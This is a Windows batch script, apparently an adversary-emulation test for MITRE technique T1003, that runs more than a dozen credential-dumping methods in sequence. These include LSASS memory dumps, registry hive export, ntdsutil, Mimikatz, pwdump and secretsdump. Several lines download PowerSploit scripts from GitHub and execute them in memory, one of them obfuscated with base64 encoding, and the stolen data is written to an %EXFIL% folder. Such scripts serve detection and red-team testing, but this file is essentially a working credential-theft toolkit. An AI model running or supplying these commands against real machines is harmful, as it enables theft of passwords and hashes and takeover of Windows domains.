@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Credential Dumping	(T1003)
ECHO.
ECHO [+] Dumping Credentials using 'GSECDUMP'
ECHO -------------------------------------------------------------------
%Utilities%gsecdump -a
ECHO.

ECHO [+] Dumping Using 'WCE'
ECHO -------------------------------------------------------------------
%Utilities%wce -o %EXFIL%\wce_output.txt
ECHO.


ECHO [+] Dumping LSASS memory using 'PROCDUMP'
ECHO -------------------------------------------------------------------
%Utilities%procdump.exe -accepteula -ma lsass.exe %EXFIL%\lsass_dump.dmp
ECHO.


ECHO [+] Executing 'NTDSUTIL'
ECHO -------------------------------------------------------------------
ntdsutil “ac i ntds” “ifm” “create full %EXFIL%\ntdsutil_out.txt q q
ECHO.


ECHO [+] Exporting SAM, SYSTEM, SECURITY registry 
ECHO -------------------------------------------------------------------
cmd /c reg save HKLM\sam %EXFIL%\sam
reg save HKLM\system %EXFIL%\system
reg save HKLM\security %EXFIL%\security
ECHO.


ECHO [+] Dumping Credentials using MIMIKATZ (Powershell In-Memory)
ECHO -------------------------------------------------------------------
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m | powershell.exe -
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m
ECHO.


ECHO [+] Executing "SETSPN"
ECHO -------------------------------------------------------------------
cmd.exe /c setspn.exe -t corp -q */*
ECHO.

ECHO [+] Executing "quarkspwdump"
ECHO -------------------------------------------------------------------
cmd.exe /c %Utilities%quarkspwdump.exe --dump-bitlocker --output %EXFIL%bitlocker.txt
cmd.exe /c %Utilities%quarkspwdump.exe --dump-hash-local --output %EXFIL%localpasswords.txt
cmd.exe /c %Utilities%quarkspwdump.exe --dump-hash-domain --output %EXFIL%domainpasswors.txt
cmd.exe /c %Utilities%quarkspwdump.exe --dump-hash-domain-cached --output %EXFIL%domaincachedpasswords.txt
ECHO.

ECHO [+] CopySamFile 'powershell'
ECHO -------------------------------------------------------------------
@echo off
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "%EXFIL%\copy_of_local_sam" -verbose | powershell.exe -
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1'); Invoke-NinjaCopy -Path "C:\Windows\System32\config\sam" -LocalDestination "%EXFIL%\copy_of_local_sam" -verbose
ECHO.

ECHO [+] Dumping LSASS memory using 'PowerShell'
ECHO -------------------------------------------------------------------
powershell -ep bypass %PAYLOAD%\T1003\LSASS_Memory_Dump.ps1
ECHO.

ECHO [+] EncodedMimikatz
ECHO -------------------------------------------------------------------
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; powershell.exe -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOw==
cmd.exe /c powershell.exe -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AUABvAHcAZQByAFMAaABlAGwAbABNAGEAZgBpAGEALwBQAG8AdwBlAHIAUwBwAGwAbwBpAHQALwBtAGEAcwB0AGUAcgAvAEUAeABmAGkAbAB0AHIAYQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoALgBwAHMAMQAnACkAOwAgACQAbQAgAD0AIABJAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAegAgAC0ARAB1AG0AcABDAHIAZQBkAHMAOwAgACQAbQAKAA=="
ECHO.

ECHO [+] Mimikatz on Disk
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe Start-Process -FilePath "%Utilities%mimikatz.exe" -Argumentlist """privilege::debug"" ""sekurlsa::logonpasswords"" ""exit"""
ECHO.

ECHO [+] Mimikatz LSADUMP
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe Start-Process -FilePath "%Utilities%mimikatz.exe" -Argumentlist """privilege::debug"" ""lsadump::sam"" ""exit"""
ECHO.

ECHO [+] Dumping Credentials using 'pwdump'
ECHO -------------------------------------------------------------------
%Utilities%pwdump7
ECHO.

ECHO [+] Dumping Credentials using 'DumpSec'
ECHO -------------------------------------------------------------------
%Utilities%dumpsec
ECHO.

ECHO [+] Dumping Credentials using 'Secretsdump'
ECHO -------------------------------------------------------------------
%Utilities%secretsdump -sam %EXFIL%sam LOCAL
%Utilities%secretsdump -system %EXFIL%system LOCAL
%Utilities%secretsdump -security %EXFIL%security LOCAL
ECHO.

ECHO [+] Dumping Credentials using 'SafetyKatz'
ECHO -------------------------------------------------------------------
%Utilities%SafetyKatz
ECHO.

ECHO [+] Dumping Credentials using 'Cmdkey'
ECHO -------------------------------------------------------------------
cmd.exe /c cmdkey /list
ECHO.

ECHO [+] Dumping LSASS memory using 'VBScript'
ECHO -------------------------------------------------------------------
cscript %PAYLOAD%\T1003\LSASS_Memory_Dump.vbs lsass.exe
ECHO.

ECHO [+] Dumping Password using Group Policy Preference files on the Domain Controller'
ECHO -------------------------------------------------------------------
findstr /S cpassword c:\Windows\sysvol\*.xml
echo [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); $m = Get-GPPPassword -Verbose; $m | powershell.exe -
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); $m = Get-GPPPassword -Verbose; $m
ECHO.

